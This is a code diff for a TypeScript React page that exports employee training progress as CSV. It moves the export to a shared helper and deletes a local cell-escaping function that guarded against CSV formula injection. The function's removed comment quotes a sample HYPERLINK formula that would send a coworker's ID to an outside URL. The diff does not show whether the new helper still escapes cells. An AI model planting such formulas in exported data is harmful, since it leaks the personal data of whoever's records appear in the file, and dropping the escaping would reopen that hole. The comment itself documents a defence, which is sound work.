@@ -47,6 +47,7 @@ import {
 } from "@/features/capacitaciones/components/EstadoPantalla";
 import { formatearFecha } from "@/features/capacitaciones/formato";
 import { useToast } from "@/hooks/use-toast";
+import { descargarCSV } from "@/shared/csv";
 
 /** Cómo se nombra y se pinta cada situación, en un solo sitio. */
 const SITUACION: Record<
@@ -156,35 +157,6 @@ const CABECERA_CSV = [
   "Constancia",
 ];
 
-/**
- * Caracteres con los que Excel, LibreOffice y Sheets empiezan a leer una FÓRMULA.
- *
- * Entrecomillar no basta: la hoja de cálculo quita las comillas al abrir el CSV
- * y evalúa lo que queda. Un cargo escrito como `=HYPERLINK("http://…"&A1)` se
- * convierte en una petición que saca la cédula de un compañero al abrir el
- * archivo, y quien lo abre no hizo nada raro: abrió el listado de su empresa.
- *
- * Ver la descripción de OWASP como «CSV Injection».
- */
-const INICIOS_DE_FORMULA = /^[=+@\-]/;
-
-/**
- * Escapa una celda de CSV y la desarma como fórmula.
- *
- * Entre comillas SIEMPRE, no solo cuando hace falta: los nombres traen comas y
- * los cargos traen punto y coma, y una exportación que se rompe en la fila 40 se
- * descubre cuando ya está en el correo de alguien.
- *
- * Descarta controles iniciales y antepone una tabulación dentro de la celda
- * entrecomillada a los valores que empiezan como fórmula. La comilla simple
- * no sobrevive de forma fiable al ciclo de guardar y volver a abrir en Excel.
- */
-export function celdaCSV(valor: string): string {
-  const limpio = valor.replace(/^[\u0000-\u001f\ufeff]+/, "");
-  const seguro = INICIOS_DE_FORMULA.test(limpio) ? `\t${limpio}` : limpio;
-  return `"${seguro.replace(/"/g, '""')}"`;
-}
-
 /** Lo que se pide al exportar. Es el techo del servidor, dicho en un sitio. */
 const LIMITE_EXPORTACION = 1000;
 
@@ -240,23 +212,13 @@ export default function CapacitacionesAvancePage() {
       });
     }
 
-    const lineas = [CABECERA_CSV, ...gente.map(filaCSV)].map((f) =>
-      f.map(celdaCSV).join(",")
+    descargarCSV(
+      `avance-${datos.asignacion.curso_titulo
+        .toLowerCase()
+        .replace(/[^a-z0-9]+/g, "-")
+        .replace(/^-|-$/g, "")}.csv`,
+      [CABECERA_CSV, ...gente.map(filaCSV)]
     );
-    // El BOM es lo que hace que Excel en Windows abra las tildes bien. Sin él,
-    // «Inducción» llega como «InducciÃ³n» y el archivo parece corrupto.
-    const blob = new Blob(["﻿" + lineas.join("\r\n")], {
-      type: "text/csv;charset=utf-8",
-    });
-    const url = URL.createObjectURL(blob);
-    const enlace = document.createElement("a");
-    enlace.href = url;
-    enlace.download = `avance-${datos.asignacion.curso_titulo
-      .toLowerCase()
-      .replace(/[^a-z0-9]+/g, "-")
-      .replace(/^-|-$/g, "")}.csv`;
-    enlace.click();
-    URL.revokeObjectURL(url);
   }
 
   const columnas: ColumnaTabla<AvanceParticipante>[] = [
